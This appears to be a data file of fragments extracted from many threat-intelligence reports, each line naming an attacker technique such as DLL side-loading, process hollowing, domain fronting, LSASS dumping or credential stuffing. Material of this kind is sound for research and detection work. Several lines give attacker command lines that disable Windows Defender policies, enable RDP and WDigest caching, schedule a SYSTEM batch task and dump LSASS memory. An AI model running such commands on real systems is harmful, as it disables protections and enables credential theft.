C:\Windows\system32\cmd.exe /C gpupdate 
C:\Windows\system32\cmd.exe /C gpupdate 
whoami.exe
cmd.exe /C whoami
The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon
the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.
They utilized RDP,
the threat actor was seen establishing RDP connections
Cobalt Strike was used to enable RDP,
remotedesktop mode = enable cmd
RDP connections were established from the beachhead host to systems throughout the environment
details of the RDP session
the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.
This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.
in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender
To evade detection, the threat actors disabled Windows Defender
they disabled Windows Defender via a group policy modification.
by adding the below to an already linked GPO.
They then force updated the GPO on all clients using Cobalt Strike.
Cobalt Strike Beacon was dropped and executed on the system
was executed via rundll32.exe
including the computer name and the OS version of the compromised system were sent
cmd.exe /C reg add
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware 
DeleteValue 
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring 
DeleteValue 
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring 
DeleteValue 
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem 
DeleteValue 
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection 
DeleteKey 
The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed
This proxied traffic
LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller.
systems injected the Conti DLL into memory
web application vulnerabilities
exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891
GrandstreamCVE-2020-25223WebAdmin of Sophos SG UTMCVE-2021-42013ApacheCVE-2022-31137Roxy-WICVE-2022-33891Apache SparkZSL-
CVE-2018-12613, a phpMyAdmin vulnerability that could allow threat actors to view or execute files
propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials
default or weak credentials
using a combination of eight common usernames and 130 passwords
malicious payload
downloads
downloads the Zerobot binary
download and execute binaries of various architectures until it succeeds
download this RAT,
identify the architecture
copies itself to the Startup folder
methodDescriptionUDP_LEGITSends UDP packets without data
TCP_HANDSHAKEFloods with TCP handshakes.TCP_SOCKETContinuously sends random payloads on an open TCP socket.
TLS_SOCKETContinuously sends random payloads on an open TLS socket.
methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.TCP_SYNSends SYN packets.TCP_ACKSends ACK packets.TCP_SYNACKSends SYN-ACK packets.TCP_XMASChristmas tree attack (all TCP flags are set).
HTTP_HANDLESends HTTP GET requests using a Golang standard library.HTTP_RAWFormats and sends HTTP GET requests.HTTP_BYPASSSends HTTP GET requests with spoofed headers.HTTP_NULLHTTP headers are each one random byte (
Zerobot HTTP requests
open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.
running commands
screenshotting,
This attachment (unless zipped) is the MyDoom executable.
executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.).
the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze.
The packer decompresses and executes
Upon execution, an attempt to alter the Windows firewall settings is made.
makes a copy of itself, places it in the “Temp” folder (C:\Users\&lt;user&gt;\AppData\Local\Temp), and changes the name to a known Windows application/process.
The activity thereafter included dumps of LSASS
process enumerations.
then launched by cmd.exe
the executable ‘3ujwy2rz7v.exe’ was downloaded
that uses command and control servers to collect information on compromised systems
A user had to click on this in order to execute the malware.
the malware immediately begins to look for EDR and antivirus software.
Phishing emails spoof legitimate senders to deliver RokRAT via LNK files
Email attachments mimic legitimate documents
several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns
targets for phishing emails containing this type of decoy document.
campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document
containing obfuscated PowerShell scripts
the obfuscation technique for the dropped files being hex-encoding vs. string concatenation
contain an encoded PowerShell,
PowerShell scripts in charge of downloading a second stage RokRAT shellcode
file download/upload
to start the download process
downloads the payload
keylogging
Optical Disc Image files (ISO) containing LNK files that had slightly modified PowerShell scripts, and Hangul Word Processor decoy documents
The ISO files that X-Force observed contained a LNK file
a JPEG decoy file are dropped
the JPEG decoy file
a batch file
a batch file
drop batch files
then the payload is executed using Windows API functions (VirtualProtect).
the payload that is decoded using the first byte as a key,
packed into a Windows executable file
stealing sensitive data from the victim’s networks.
the adversary identifies data of interest from the network of the victim
This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.
the adversary collected the data from various sources within the victim’s network.
Credential theft and password spraying
password spraying attack against the victim’s remote services,
With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised
The adversary started a password spraying attack against those domain admin accounts,
The user account was possibly compromised on the Linux server by using credential stuffing or password spraying:
Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.
Password spraying
or password spraying.
This adversary starts with obtaining usernames
The built-in Windows quser-command to show logged on users is also heavily used by them.
To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals
to identify if privileged users are active on the systems
These credentials are used in a credential stuffing
The user account was possibly compromised on the Linux server by using credential stuffing
Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.
credential stuffing
more specifically by credential stuffing
After obtaining a valid account, they use this account to access the victim’s VPN, Citrix or another remote service that allows access to the network of the victim.
With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.
the adversary used the valid account to directly login
The threat used valid accounts against remote services:
the adversary accessed the company portal with the valid account.
cloud drive, or other cloud resources accessible by the compromised account.
the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.
starts using the Cobalt Strike beacon for remote access and command and control.
If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller
After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network,
and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.
successfully got a valid domain admin account this way.
In other cases, the adversary moved laterally to another system with a domain admin logged in.
This can be anything from file and directory-listings,
the adversary copying results of the discovery phase, like file- and directory lists from local systems,
If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.
The adversary uses the command and control channel to exfiltrate small amounts of data.
adversary executes Cobalt Strike’s built-in Mimikatz to dump its password hashes.
We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going
the actor executes Cobalt Strike’s built-in Mimikatz to dump its credentials or password hash
, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.
Files and folders of interest are collected as well and staged for exfiltration.
We’ve seen the adversary staging data on a remote system or on the local system.
This activity group always uses a renamed version of rar.exe.
The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.
The DLL’s used were side-loaded in memory on compromised systems.
File deletion
Use scheduled tasks
The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
An example of the creation of such a scheduled task by the adversary:
schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
batch files for automation.
The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.
executing a batch-file (.bat) to perform their tasks.
They switched to C2 encapsulated in HTTPS in Q3 2019.
the adversary achieving credentials access by brute force
The adversary installs a hackers best friend during the intrusion: Cobalt Strike.
the adversary also searches for VPN and firewall configs,
This lures users to double-click the graphic to view the content,
Malicious documents that implement this technique require users to double-click a document element.
capturing screenshots
and enumerating files and drives
establish persistence by creating a registry key under \SOFTWARE\Microsoft\Windows\CurrentVersion\Run only if the victim’s machine name differs.
include exfiltrating system information
implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.
the obfuscation techniques used
obfuscated using Crypto Obfuscator,
malicious dynamic link library (DLL) file that’s eventually side-loaded to the application.
to a side-loading vulnerability that
We’ve seen the payload delivered in diverse ways including DLL side-loading,
abuse legitimate applications vulnerable to DLL side-loading attack.
DLL Side-Loading
A benign, legitimate executable abused to side-load the malicious DLL
The malicious side loaded DLL
WDSyncService.exe executable abused to side-load a malicious DLL 
Side loaded malicious DLL 
abused to side-load the malicious DLL.
executable abused to side-load malicious DLL 
DLL Side-Loading
DLL Side-Loading
that is abused to side-load a malicious DLL
executable that dropped a legitimate WD Discovery app to side-load the malicious WDLocal.dll
side-loads malicious WDLocal.dll The side-loaded DLL
DLL side-loading is a highly effective technique for tricking Windows systems into loading malicious code.
Adversaries use side-loading attacks for execution
Once the executable starts running, it side-loads the malicious DLL
to lure victims into downloading a malicious file
designed to steal sensitive information, including login data, cookies, and Facebook ad and business account information.
The scripts are encoded using different techniques,
(base64 encoded with string replacements)
uses are compressed and encrypted
Base64 encoded string with several string replacements.
self-written extensions that obfuscate the PHP scripts.
And malicious payloads are also sometimes encrypted/packed or obfuscated
obfuscated with SmartAssembly
base64 encoded with some string modifications
it downloads the file from its command and control (C2) server,
they’re downloaded from the C2
executes, it drops a PHP application with additional files
Download and run
Downloads a file from the given URL and executes it with the given arguments.
the given task the downloaded file
the new stealer is downloaded and executed
  Upload file function 
then decodes and executes it.
In the main thread the SFX/ZIP file is executed/decompressed,
DLL that decodes and drops three files
It starts with de-obfuscating the next stage (string replacements + base64 decoding)
Once decoded, this executable, written in Rust and compiled with Cargo, gets the current date and time, and decrypts Chromium-based browsers’ encryption key 
It does this by decoding the rss.txt into an executable
the executable decodes and drops the next stage
it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.
registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument.
Creates a scheduled task to be executed with d as an argument 
Responsible for installing persistence via scheduled tasks
The attacker must know the time to set it in the scheduled task.
createTS—creates scheduled task. createLG—creates scheduled task at logon 
it creates a scheduled task that executes the updated routine, which triggers at log-on and every 30 minutes.
registers two scheduled tasks:
embeds legitimate DLLs using the SmartAssembly feature 
Once the execution completes, the file is deleted to leave no evidence on the machine.
the file is deleted to remove evidence from the machine.
passes this command line as an argument
Gets a command to run, executes it
 Gets command from C2 and executes it 
Executable that accepts an executable as an argument and executes it with hidden console
“wmic os get LocalDateTime /value”.
to steal the victim’s Facebook information and send it back to the C2.
Extract victim’s sensitive Facebook data using the graph API and send the results to a C2 server 
The malware can extract this information and send it to its command and control (C2) server
API functions.
API calls
the API calls
calls point to a suspicious API
creation functions like NtCreateUserProcess, NtCreateProcessEx, CreateProcessInternalW, CreateProcessA or CreateProcessW.
an exported function from one of the Windows libraries
suspicious APIs often used in code injection techniques like CreateRemoteThread or NtSetContextThread.
frequently called API function
critical APIs
Microsoft Outlook Messaging API (MAPI) module
process creation library functions
calls the NtProtectVirtualMemory function where the NewAccessProtection argument is PAGE_EXECUTE_READWRITE and the BaseAddress argument is an address to a library function
uses a variation of AtomBombing that queues an APC to call memset to clean an RW region in ntdll.dll.
dispatch an asynchronous procedure call (APC) to the APC queue of a target process thread using NtQueueApcThread
the injector process dispatches another APC using NtQueueApcThread to force the remote process to execute NtSetContextThread.
it queues an APC into the patched GlobalGetAtomA to get the payload running.
APC routine argument in the case of NtQueueApcThread,
AtomBombing is the write-primitive, which allows writing to the remote process using atom tables and APC.
AtomBombing Injection Technique
AtomBombing is a technique that allows malware to inject code while avoiding calling suspicious APIs
Malware using the AtomBombing technique first writes the payload into the global atom table, which can be accessed by all processes.
uses a slightly modified AtomBombing technique that injects one of its stages into a Windows process
the malware can read HTTP-POST headers
injects the main bot into svchost.exe.
Injected Processes
Process Injection via Hooking
use this technique to inject themselves into other processes
they inject their main bot into a Windows process, and then inject their other modules into different processes according to the module’s purpose
an injection into a web browser process.
injected thread
they suspend the remote process threads
The injected process
goes through processes one by one
used to steal victims’ sensitive data.
injects its main bot into a hollowed instance of svchost.exe
implemented process hollowing by first using VirtualProtectEx on the process entrypoint, and then writing the hook stub using WriteProcessMemory.
Process hollowing is a process injection technique that creates a new legitimate process in a suspended mode, unmaps its main image and replaces it with malicious code.
The malicious code is written into the newly created process and the suspended thread context instruction pointer is changed using NtGetContextThread/NtSetContextThread.
for process hollowing from a WoW64 process into a 64-bit svchost.exe
Evasive Process Hollowing By Entrypoint Patching
Evasive Process
Evasive Process Hollowing by Entrypoint Patching
Decompresses a local buffer
Common injection methods used by banking Trojans involve writing a mapped PE into a remote process using WriteProcessMemory
obscure the call by wiping artifacts from the buffer, such as wiping the PE header.
malware disguised as Hancom Office document files.
“Who and What Threatens the World (Column).exe” and is designed to deceive users by using an icon that is similar to that of Hancom Office.
creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.
malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.
connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.
URL registered in the task scheduler appears to be a normal homepage
Decompressing the compressed file
Decompressing
injected and executed within the normal Windows process called mstsc.exe.
of mstsc.exe being executed after being injected with malware
deleted using the cmd command.
registers its file with the name onedrivenew under the Run key
registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.
schtasks.exe command to register the file to the task scheduler with
URL registered in the task scheduler
connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.
using an obfuscated Meterpreter stager
One of the techniques to conceal the traffic from DNS-based filtering is Domain Fronting.
Domain fronting uses legitimate or high-reputation domains to remain undetected by defenders.
domains for domain fronting may indicate an interest in the geopolitics of this area of the world.
the domain fronting functionality before launching the attack.
The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.
Domain fronting can be achieved with a redirect between the malicious server and the target.
actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.
The beacons are of particular interest due to the domain fronting technique using a government host as the initial DNS lure.
The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host
Domain fronting is a technique used by attackers to circumvent protection based on DNS filtering.
modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host.
The threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network
.]net via HTTP Get and POST metadata specified in the beacon's configuration.
relies on other parts of the HTTP request, including the Host header and the actual C2
suspicious section .kxrt with the packed and encoded malicious code.
decryption routine is executed that decrypts the remaining malicious code in the .kxrt section and writes it to the virtual memory.
Decoder routine to decrypt the beacon DLL.
The decrypted malicious code
Once decoded, the loader's execution jumps to the beginning of the DLL
now responsible for decoding the configuration.
by calling WinHTTPGetProxyForUrlEx and WinHTTPCreateProxyResolver
calls the VirtualProtect function
modifies the victim's system power and lid open/close policies in the registry.
can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy.
routed through European TOR VPN exit nodes.
VPN access using Single Factor authentication.
Minidump of LSASS process memory
The minidump function of comsvcs.dll can be used to dump lsass.exe.
leveraging comsvcs.dll with proxy execution by rundll32.exe.
do rundll32.exe C:\windows\System32\comsvcs.dll,
Conducting discovery indirectly via schedule tasks named “Windows Update”
performing remote directory listings.
to discover interesting to them directories
Leveraging a dual-use tool, PCHunter64, to acquire detailed process and system information.
Threat actors can use windows binaries and commands
RDP connection established
Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network
the threat actor was able to RDP unencumbered across the organization’s infrastructure.
The threat actor executed two actions to bypass Windows Defender
the threat actor leveraged one of the most popular dual-use agents, AnyDesk, to provide persistent remote access into the affected organization on multiple systems.
several files were staged for possible, but unconfirmed exfiltration
spear phishing emails that contain a .csv or .xlt file attachment
The email is directed to “Non-Resident Alien” tax payers to have them fill out a PDF file (that is attached to the email)
a cyber-attack in the form of credential stuffing,
Enduring Credential Stuffing
using login credentials from what the company suspects are past data breaches from other companies
replace the “ServiceManager.exe” file from the driver folder with a malicious file to trick the driver into running the tainted file
log keystrokes
a vulnerability in unencrypted Wi-Fi routers that makes them susceptible to a TCP exploit.
A threat actor could take advantage of this vulnerability by creating a specific file that contains data that is stored in the JET database format, and having the targeted user open it, which would then allow for remote code execution at the level of the current process
This vulnerability, registered as “CVE-2018-14327,” allows a low-privileged user account to escalate privileges on any Windows machine that had connected to the EE Mini modem via USB.
decrypts that specific payload code
A threat actor could establish an administrator session
a payload download code that grabs malware to download and install the backdoor.
then sign on as a legitimate user
decrypting database passwords from Windows registry values
decrypting them from Windows registry values
decrypt the more sensitive data in the user’s database.
decrypt these database passwords,
decryption
decryption
decrypts the password
decrypted dba user password.
decrypts this payload
decrypting the appropriate loader
decryption
decrypts the payload
decrypting them
gather database passwords
steal database passwords and configuration information
steal credentials by decrypting them from registry values.
Exfiltrated credentials
decrypt these database passwords
decrypts the password for the dba username
decrypted dba user password.
successfully obtain the database passwords
steal credentials by decrypting them from registry values
the encryption key for sensitive data
encrypted
encryption
encryption
XORed with the value
encrypted using its own XOR key
encrypted payload
write module to the encrypted storage
unpacks and loads the next stage of the malware, namely the main module
unpacking the main module and
handles communication between the modules and attacker’s C&amp;C server.
0x10000013data for C&amp;C server (execution logs, stolen data, …)
upload data to C&amp;C
exfiltrates data over its C&amp;C channel.
acquire a list of the running processes and their loaded modules
collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line
collect information about loaded modules for each of the running processes
0x10000025get handle of the process with specified PID
enumerates running processes
get information about processes running on a system
stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys
Windows registry Run key
GetComputerName API
GetTickCount Windows API
PeekNamedPipe Windows API function
information about specific registry keys
queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data
is injected into one of the processes specified by the C&amp;C
module is injected into one of the processes specified by the C&amp;C
is injected only into processes running under WOW64.
its injection into one of the following processes
0x10000012inject and execute received module in specified process
injected first,
inject a networking module
inject processes that are expected to communicate over the network
0x0AInject and execute received module in specified process
0x0BInject and execute received module in specified process
inject and execute received module in specified process
scanning selected IP addresses
scan specific IP addresses
IP addresses intended for scanning and the special “ping” IP address
scanning IPs specified in the command data to collect additional information about the environment
scan of the selected IP addresses
downloaded from the C&amp;C along with the ModScan module
parsing payload received in the C&amp;C responses
download additional payloads and C&amp;C commands
TCP ports 50123
and 2638
by sending a specially crafted TCP packet
sends a hardcoded TDS 4.2 &amp; 5.0 Login Packet (Figure 6) to the specified IP address on port 2638
transmitted using the lightweight networking module,
Version of the Oracle
information about the database server and the TDS versions used
sending an HTTP Post message
module uses HTTP and port 80.
avoid system processes that might attract attention if caught communicating over the network
HTTP POST or GET methods
uses HTTP for command and control
stored between data xml tags (&lt;data&gt;%version%&lt;/data&gt;) of the response from the service
encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L.
being the payloads stored in the resources
encrypted within the main module’s code.
with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.
hash of the dropped loader to change with each execution,
creating a Windows service
create a new service for persistence.
Decompiled code responsible for loading the payload from the binary’s resources,
Communication with the C&amp;C is encrypted using AES in CBC mode
XORed with the first 4 bytes of the AES key used to encrypt the message.
encrypts communication with C&amp;C using AES in CBC mode
using Windows Command Shell to execute the initial dropper.
use Registry Run key for persistence
inject it’s modules into various processes.
gathers username and computer name from victim machines and reports them to the C&amp;C in initial message.
The attack revolves around a DLL sideloading
DLL sideloading scenario, the malicious loader (ffmpeg.dll) would replace the clean dependency;
DLL sideloading
DLL sideloading
encoded malware
encrypted payload
malicious encoded .ico payload
generate the HTTP request
these appear to be maliciously patched versions of the legitimate ffmpeg.dll
GetSystemTimeAsFileTime Api call
which initiates the payload download
malware tries to login and get access to the victim server via brute force.
tries to get access to the server via brute force
malware samples are packed with UPX Packer.
Upon unpacking a sample
the malware uses a set of credentials that is hard coded into the malware binary,
Hard-coded credentials for brute forcing.
from the decrypted configuration
The malware then de-XORs other strings, with the hard-coded key
Most of the strings are de-XOR’d in a function
simply de-XOR the entire binary
Also the de-XOR’d strings,
Once the malware has de-XOR’d all its strings, it invokes a method named go.
we find an XOR loop that decrypts this configuration.
as a hard-coded XOR key
we find an XOR loop
This produces strings including a commandline usage:
can be set via the command-line as well.
This parses command-line options
the data will be published on our TOR darknet sites.
nan
this snippet of code invokes ptrace with PT_DENY_ATTACH (0x1f) which will kill the process if a debugger is currently attached,
the embedded .NET injector and PE payload(s).
embedded payloads of one of the IronPython scripts.
the main task of loading malware is done by an embedded process injector.
IronNetInjector is made of an IronPython script that contains a .NET injector and one or more payloads.
Contain an encrypted .NET injector and one or more encrypted PE payloads.
Embedded .NET injector and payload(s) are encoded with Base64 and encrypted with Rijndael.
script with embedded .NET injector and ComRAT payload
the embedded payloads in the IronPython scripts,
embedded malware:
the embedded files in the scripts
These scripts contain an embedded PE loader to execute an embedded malware payload.
the embedded .NET injector
which in turn injects the payload(s) into its own or a remote process.
contains the ability to inject .NET assemblies into unmanaged processes.
the payload is either loaded into its own process or a remote one.
remote process the payload gets injected to.
the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process.
the injector is its ability to load an assembly into an unmanaged process.
to load an assembly into an unmanaged process.
The method InjectAssembly is used to inject a .NET assembly into a native process
Function and variable names are obfuscated
Strings are encrypted
scripts are obfuscated to prevent easy detection.
Decoded IronPython script
the Rijndael decryption key is passed.
get decoded and decrypted
The decryption key is passed as an argument
full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.
PowerShell Empire’s ReflectivePEInjection script
The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload.
As a command line argument
Windows task XML file
The task is used to start an IronPython script
The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created:
the Windows task XML
The task file is then used to create a task which in turn starts a script when triggered.
a Windows task XML to start
the submitter collected the files from different places
This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards.
DLL gets injected
The output is then parsed to the targeted process ID with the help of tasklist filters.
Contains the imported unmanaged function declarations and win32 structures/constants.
being able to use the .NET framework APIs directly from Python.
can use .NET framework APIs
use of the .NET framework APIs
when .NET framework APIs are used in the code
use of WMI to both store and persist the backdoor
Windows Management Instrumentation (WMI).
to use WMI for storage and
persistence.
WMI provides many administrative capabilities
on local and remote systems, including querying system information,
starting and stopping processes, and setting conditional triggers.
WMI
can be accessed using a variety of tools, including the Windows WMI
Command-line (wmic.exe), or through APIs accessible to programming and
scripting languages such as PowerShell.
WMI permanent event subscriptions can be used to trigger actions
when specified conditions are met.
Subscriptions consist of three core WMI classes: a Filter, a
Consumer, and a FilterToConsumerBinding.
WMI Consumers specify an
action to be performed, including executing a command, running a
script, adding an entry to a log, or sending an email
Creating a WMI permanent event subscription
WMI Filters
define conditions that will trigger a Consumer, including system
startup, the execution of a program,
then created a WMI event subscription in order to execute the
backdoor
use WMI to persist a backdoor and also store
the PowerShell backdoor code.
created a new
WMI class and added a text property to it in order to store a string
value.
The WMI component of the POSHSPY backdoor leverages a Filter to
execute the PowerShell component of the backdoor on a regular basis.
WMI Component
“BfeOnServiceStartTypeChange” WMI
Query Language (WQL) filter condition
The BfeOnServiceStartTypeChange Filter was
bound to the CommandLineEventConsumer WindowsParentalControlsMigration.
legitimate WMI persistence
attacker use of WMI
WMI persistence.
decrypted, and executed the backdoor code
Decoded CommandLineTemplate PowerShell code
wrote the encrypted and base64-encoded PowerShell
backdoor code
base64-encoded PowerShell command.
executing PowerShell code as an EncodedCommand
to download and execute additional
PowerShell code and Windows binaries
Downloading and executing PowerShell code
Encrypting communications using AES and RSA public key cryptography
Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the
chosen directory name
Appending a file signature header to all encrypted data,
appended file
headers used to bypass content inspection made this backdoor difficult
to identify
Word document lure requesting the user to run the VBA macro.
When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents.
Packed DLL analysis
packing being used to obfuscate the malware.
there is indeed some sort of unpacking happening.
Although the unpacking procedure happens in multiple steps
As soon as the unpacked executable is running
An Examination of its Unpacking Routine
its unpacking routine
Once the “.tmp” file is found, it is moved and renamed to the Office templates folder
loaded using rundll32.exe.
As a second argument, the macro passes the entry function “DllUnregisterServer” to rundll32.exe so that the execution starts correctly.
runs rundll32.exe to load the malware.
executes it using rundll32.exe
Looking at the decrypted data
the decryption process starts
data that will be decrypted
The algorithm to decrypt the data is simple.
the second decryption stage occurs
the decrypted memory structure
Before the decryption starts
contains the decryption algorithm for the second stage
The output of this decryption
The decryption algorithm
the executable code used to decrypt the encrypted data
After successfully decrypting the C2 URLs
all the decrypted C2 URLs
the malware calls a decryption function
Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.
decryption function.
can be decrypted to an active malware download server
The API function located at the beginning of the memory section are resolved using GetProcAddress
Windows API functions
Windows API functions
After resolving the functions
The names of Windows API functions are stored in the first 150 bytes
several Windows API functions are resolved using GetProcAddress
memory structure contains executable code.
Data view of the section containing the encrypted malware.
The area after this contains encrypted data.
Structure of the encrypted section.
encrypted URLs contained in the malware itself.
the encrypted data
This technique is called self-injection or PE overwrite
This function obtains the username,
the computer name and the domain of infected system.
the computer architecture
generated based on the computer architecture.
The subsequent functions collect additional information such as the machine’s public IP address
To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm
After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data
making a HTTP GET request
the malware initiates a download, which delivers an executable
Its main purpose is to download and execute a second stage malware payload
Thread Execution Hijacking
Thread Execution Hijacking
The final execution method Hancitor supports is Thread Execution Hijacking.
The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards.
Process Hollowing
Process Hollowing
If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.
The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread.
Process Injection method
the malware was distributed as email Word document attachments
then recursively searches through all local temp folders.
Query string containing system information before being sent to the C2.
The backdoor
uses domain fronting to obfuscate its true C2 server
The fronted
domain is configured by an earlier stage of execution and the actual
domain is hard-coded in the backdoor.
PowerShell initiated the
first connection to the fronted domain
communicates with its C2 server using HTTPS
its C2 server consists of
JSON data exchanged via HTTP POST requests.
HTTP POST request that contains
the command output.
C2
server via a subsequent HTTP POST request
its C2 server via a
subsequent HTTP POST request.
its C2 server every five
seconds via HTTP POST requests.
backdoor that supports commands, including screen capture
Upload a screen capture
keystroke capture
The backdoor writes captured
keystrokes to memory
continuously captures keystrokes
the keylogging utility
This attacker utilized an additional keylogging utility
The keylogging utility was configured
to capture and record keystrokes to C:\ProgramData\psh\System32Log.txt.
Keylogger Deployment
keylogger
The backdoor may also download and execute
additional PowerShell commands from its command and control (C2) server.
Downloaded VBScript and PowerShell
a PowerShell script block was executed
to download
PowerShell to connect to third-party file sharing
sites to download the UltraVNC application
PowerShell to connect to third-party file sharing
sites to download an NGROK utility
use UltraVNC to download two LNK
files
used UltraVNC to download an in-memory dropper
using UltraVNC to download and store
a file
deployed additional tools
The Data field may contain RC4-encrypted, Base64-encoded command
The backdoor uses an RC4 key
configured by an earlier stage of execution to encrypt and decrypt the
Data field
observed the RC4 key
UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and
decryption.
RC4-decrypts command data returned in
the Data field.
The dropper configures
the backdoor with a C2 server address, RC4 encryption key,
Base64-decodes
decryption.
decrypt the
Data field.
decrypts and executes in memory
embedded key to decrypt the source code
the deobfuscated SMOKEDHAM dropper.
Upload a screen capture to its C2
server
The backdoor writes captured
keystrokes to memory and uploads them to its C2 server
reg.exe add
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
created a persistence mechanism for NGROK by adding
VirtualHost.vbs to the WindNT value under the current users Run
registry key.
created a persistence mechanism for UltraVNC by adding the
application to the ConhostNT value under the current users Run
registry key.
reg.exe add
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
store
a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start
Menu\Programs\Startup\ directory
the command line argument
provided
passed as an argument on the
command line.
executed using the Command-Line Compiler.
launched with a command
line
using Command Prompt.
backdoor source code is embedded as an encrypted
string.
whoami.exe
systeminfo.exe
reg.exe ADD
'HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
modifying
Terminal Server registry key values
modifying the Local Security Authority (LSA)
registry key value
reg.exe ADD
'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v
fDenyTSConnections /t REG_DWORD /d 0 /f
reg.exe ADD
'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v
fSingleSessionPerUser /t REG_DWORD /d 0 /f
reg.exe ADD
HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v
LimitBlankPasswordUse /t REG_DWORD /d 1 /f
modified the WDigest registry key value
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
to enable credential caching.
to enable multiple Remote Desktop
connection sessions
the attacker was observed moving laterally to
different systems in the environment using Remote Desktop Protocol
(RDP) connections.
attacker dump the LSASS process using Task
Manager to a file named lsass.DMP, and later, zip the dump into two
files named lsass.zip and lsass2.zip located in the
C:\ProgramData\psh\ directory.
LSASS Dumping
conducted credential harvesting
via dumping LSASS memory.
activity from Tor
hop points to enable their cyber operations while remaining anonymous.
“The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.
